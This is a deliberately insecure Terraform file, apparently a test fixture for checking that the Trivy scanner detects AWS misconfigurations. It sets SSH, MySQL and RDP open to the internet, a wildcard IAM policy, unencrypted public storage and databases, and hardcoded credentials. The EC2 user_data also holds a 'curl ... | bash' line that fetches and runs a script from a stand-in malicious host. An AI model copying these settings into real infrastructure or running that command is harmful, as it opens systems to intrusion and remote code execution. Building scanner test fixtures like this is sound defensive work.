# ⚠️ THIS FILE IS INTENTIONALLY VULNERABLE
# It is used to verify that Trivy correctly detects security issues

# ❌ VULNERABILITY 1: S3 bucket without encryption
resource "aws_s3_bucket" "vulnerable_bucket" {
  bucket = "test-vulnerable-bucket-insecure"
  
  # No encryption configured = CRITICAL
  # No versioning = HIGH
  # No logging = MEDIUM
}

# ❌ VULNERABILITY 2: Security Group too permissive
resource "aws_security_group" "vulnerable_sg" {
  name        = "vulnerable-security-group"
  description = "Intentionally insecure SG for testing"
  
  # SSH open to ALL INTERNET = CRITICAL
  ingress {
    description = "SSH from anywhere"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # ❌ DANGER!
  }
  
  # MySQL open to ALL INTERNET = CRITICAL
  ingress {
    description = "MySQL from anywhere"
    from_port   = 3306
    to_port     = 3306
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # ❌ DANGER!
  }
  
  # RDP open = CRITICAL
  ingress {
    description = "RDP from anywhere"
    from_port   = 3389
    to_port     = 3389
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # ❌ DANGER!
  }
  
  # Egress overly permissive
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# ❌ VULNERABILITY 3: EC2 instance without security
resource "aws_instance" "vulnerable_instance" {
  ami           = "ami-12345678"
  instance_type = "t2.micro"
  
  # ❌ No metadata_options (IMDSv1 vulnerable to SSRF)
  # ❌ No monitoring
  # ❌ No EBS encryption
  
  # Hardcoded secret in user_data = CRITICAL
  user_data = <<-EOF
              #!/bin/bash
              export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
              export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
              export DATABASE_PASSWORD="SuperSecretPassword123!"
              
              # Dangerous commands
              curl http://malicious-site.com/install.sh | bash
              EOF
  
  # No root_block_device encryption
  root_block_device {
    encrypted = false  # ❌ Data not encrypted
  }
}

# ❌ VULNERABILITY 4: IAM Policy too permissive
resource "aws_iam_policy" "vulnerable_policy" {
  name        = "VulnerableAdminPolicy"
  description = "Dangerously permissive policy"
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect   = "Allow"
        Action   = "*"           # ❌ All actions!
        Resource = "*"           # ❌ On all resources!
      }
    ]
  })
}

# ❌ VULNERABILITY 5: RDS without security
resource "aws_db_instance" "vulnerable_db" {
  identifier           = "vulnerable-database"
  engine               = "mysql"
  instance_class       = "db.t3.micro"
  allocated_storage    = 20
  username             = "admin"
  password             = "Password123!"  # ❌ Hardcoded password!
  
  publicly_accessible  = true            # ❌ Exposed to the Internet!
  storage_encrypted    = false           # ❌ No encryption!
  skip_final_snapshot  = true
  
  # No backups
  backup_retention_period = 0            # ❌ No backups!
}
